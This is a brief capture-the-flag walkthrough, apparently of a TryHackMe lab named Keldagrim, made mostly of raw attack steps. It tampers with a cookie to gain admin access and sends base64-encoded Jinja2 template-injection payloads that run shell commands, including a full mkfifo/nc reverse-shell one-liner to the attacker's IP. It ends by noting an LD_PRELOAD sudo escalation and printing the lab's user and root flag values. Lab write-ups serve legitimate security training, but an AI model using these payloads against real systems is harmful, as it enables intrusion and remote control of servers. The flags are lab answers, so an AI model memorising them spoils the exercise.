# Keldagrim 

> VOiD | Friday 13 August 2021 08:32:04 PM IST

My IP : 10.11.43.119
Target IP : 10.10.169.171

# PORT 80

check cookies
change base64d guest to admin

navigate to /admin
change base64d sale to ssti command
```bash
# to check
echo -n "{{2+2}}" | base64            
e3syKzJ9fQ==


{{ ''.__class__.__mro__[1].__subclasses__()[401]('ls',shell=True,stdout=-1).communicate()}}
e3sgJycuX19jbGFzc19fLl9fbXJvX19bMV0uX19zdWJjbGFzc2VzX18oKVs0MDFdKCdscycsc2hlbGw9VHJ1ZSxzdGRvdXQ9LTEpLmNvbW11bmljYXRlKCl9fQo=
# it works

{{ ''.__class__.__mro__[1].__subclasses__()[401]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.43.119 4444 >/tmp/f',shell=True,stdout=-1).communicate()}}
e3sgJycuX19jbGFzc19fLl9fbXJvX19bMV0uX19zdWJjbGFzc2VzX18oKVs0MDFdKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMS40My4xMTkgNDQ0NCA+L3RtcC9mJyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKX19

user jed
cat user.txt 
thm{d55ac4d0a728741d7b8c23b999e73cf3}

sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps


env_keep+=LD_PRELOAD
vulnerable
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

user root
root.txt
thm{bf2a087f833b58df233c0f24eac3aec5}

```


